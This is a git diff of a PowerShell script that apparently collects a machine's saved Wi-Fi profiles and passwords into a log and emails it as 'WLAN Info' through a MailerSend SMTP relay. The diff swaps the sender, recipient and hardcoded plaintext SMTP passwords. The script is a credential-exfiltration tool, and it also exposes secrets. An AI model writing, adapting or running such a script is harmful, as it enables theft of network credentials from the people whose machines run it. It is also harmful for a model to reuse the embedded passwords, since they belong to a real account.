@@ -3,8 +3,9 @@
 $logPath = "$env:username"+"_"+"$(get-date -f yyyyMMdd_HHmmss).txt"
 
 # SMTP settings
-$From = "MS_yA4y9Q@trial-3yxj6ljpew0ldo2r.mlsender.net"
-$To = "it.c0nt1n3ntal@gmail.com"
+$From = "MS_qt3BSV@trial-351ndgw29exgzqx8.mlsender.net"
+# $To = "it.c0nt1n3ntal@gmail.com"
+$To = "cybercampaign.ti_lo_fa@conti.de"
 $Attachment = $logPath
 $Subject = "WLAN Info " + $(get-date -f yyyyMMdd_HHmmss) 
 $Body = "<h2>WLAN Info!</h2>"
@@ -13,7 +14,7 @@ $SMTPServer = "smtp.mailersend.net"
 $SMTPPort = "587"
 # Create the credentials object
 $smtpUsername = $From
-$smtpPassword = ConvertTo-SecureString -String "oFENPhUJMs7TOQAf" -AsPlainText -Force
+$smtpPassword = ConvertTo-SecureString -String "f8PXIvmcRIaEcLnT" -AsPlainText -Force
 $smtpCredential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $smtpUsername, $smtpPassword
 
 # Initialize an array to store all Wi-Fi profiles and their passwords
